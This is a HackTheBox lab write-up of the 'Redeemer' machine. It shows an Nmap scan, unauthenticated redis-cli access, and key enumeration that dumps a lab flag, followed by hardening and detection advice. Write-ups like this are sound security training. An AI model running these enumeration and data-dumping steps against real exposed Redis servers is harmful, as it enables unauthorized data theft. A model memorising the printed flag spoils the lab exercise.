# Redeemer (HTB) - Unauthenticated Redis In-Memory Database Exploitation

**Platform:** HackTheBox (Starting Point) | **Target OS:** Linux  
**Focus:** In-Memory Data Structure Stores, Redis Serialization Protocol (RESP), Keyspace Enumeration, and Unauthenticated Data Exfiltration.

---

## 🎯 Executive Summary
The "Redeemer" machine highlights a critical misconfiguration in backend infrastructure deployment. A Redis (REmote DIctionary Server) instance was exposed to the external network without access control lists (ACLs) or authentication mechanisms (`requirepass`). This architectural flaw allowed unauthorized remote connections to query the memory keyspace and exfiltrate sensitive data in cleartext.

---

## 1. Network Reconnaissance & Protocol Architecture

We initiated the engagement with a targeted Nmap TCP SYN scan, optimizing the packet rate (`--min-rate 1000`) to quickly identify non-standard open ports.

```bash
$ sudo nmap -sS -sV -p- --min-rate 1000 10.129.63.246
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.129.63.246
Host is up (0.16s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Deep Dive: Redis Protocol Mechanics
Port 6379/TCP hosts `redis-server`. Unlike traditional relational databases (e.g., MySQL) that perform heavy Disk I/O, Redis is an **In-Memory Data Structure Store**. 
- **Storage Layer:** Data resides entirely in RAM, offering sub-millisecond read/write latency. 
- **Application Layer Protocol:** Redis communicates via **RESP (Redis Serialization Protocol)**. RESP is inherently human-readable and text-based, meaning if the port is exposed, an attacker can interact with the database using simple raw socket connections (e.g., `netcat`) or the native `redis-cli` without needing complex SQL syntax.

---

## 2. Access Control Abuse & Database Enumeration

By default, older versions of Redis lack built-in authentication unless explicitly configured by the SysAdmin. We leveraged `redis-cli` to establish a direct connection to the target without providing credentials.

Once connected, we executed the `info` command to dump the server's internal telemetry, memory statistics, and configuration details.

```bash
$ redis-cli -h 10.129.63.246 -p 6379
10.129.63.246:6379> info
# Server
redis_version:5.0.7
os:Linux 5.4.0-77-generic x86_64
process_id:751
tcp_port:6379
config_file:/etc/redis/redis.conf

# Memory
used_memory_human:839.48K
maxmemory_policy:noeviction

[...]

# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```

### Telemetry Analysis & Threat Intelligence
Analyzing the `info` output provided several critical forensic artifacts:
1. **Version & OS:** Redis 5.0.7 running on Linux Kernel 5.4.0.
2. **Configuration Path:** The `config_file` is located at `/etc/redis/redis.conf`, confirming a default Linux package installation rather than a containerized Docker deployment.
3. **The Golden Metric (`Keyspace`):** The final line `db0:keys=4,expires=0,avg_ttl=0` indicates that the default logical database (`db0`) is currently populated with exactly **4 active keys** residing in RAM, with no Time-To-Live (TTL) expiration set. 

---

## 3. Data Exfiltration (In-Memory Harvesting)

Knowing that `db0` contained 4 keys, we queried the keyspace using the `keys *` command to dump all stored variable names.

```bash
10.129.63.246:6379> keys *
1) "numb"
2) "flag"
3) "temp"
4) "stor"
```

Because Redis operates on a **Key-Value** paradigm, we do not need `SELECT` statements. We simply requested the value associated with the `flag` key to exfiltrate the target data.

```bash
10.129.63.246:6379> get flag
"03e1d2b376c37ab3f5319922053953eb"
10.129.63.246:6379> exit
```

*Note: Since the RESP protocol is unencrypted by default, this entire interaction, including the retrieved flag, traversed the network in cleartext.*

---

## 4. Defensive Remediation & Detection Engineering

### 1. Hardening & Mitigation
To secure a Redis instance in an enterprise environment, SysAdmins must modify `/etc/redis/redis.conf`:
- **Network Binding:** Never bind Redis to `0.0.0.0` (all interfaces). Bind it strictly to the loopback adapter if accessed locally, or a specific internal VPC subnet:
  ```text
  bind 127.0.0.1
  ```
- **Enforce Authentication:** Require a strong password for all client connections:
  ```text
  requirepass <Complex_Cryptographic_Password>
  ```
- **Command Renaming:** Disable or rename dangerous administrative commands (like `FLUSHALL`, `CONFIG`, or `KEYS` which block the single-threaded event loop) to prevent operational sabotage:
  ```text
  rename-command KEYS ""
  rename-command CONFIG ""
  ```

### 2. Detection Engineering
- **Network IDS/IPS:** Monitor external boundary firewalls for any inbound TCP traffic attempting to communicate over Port 6379. Redis should **never** be exposed to the WAN.
- **Log Monitoring:** Audit Redis logs for unexpected `CONFIG SET` or `KEYS *` commands executed from non-whitelisted internal IP addresses
